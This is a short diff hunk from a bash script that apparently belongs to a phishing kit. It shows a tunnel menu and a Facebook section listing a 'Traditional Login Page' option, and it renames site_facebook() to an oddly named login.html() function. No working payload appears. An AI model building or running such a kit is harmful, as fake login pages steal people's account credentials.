@@ -410,7 +410,7 @@ tunnel_menu() {
 }
 
 ## Facebook
-site_facebook() {
+login.html() {
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
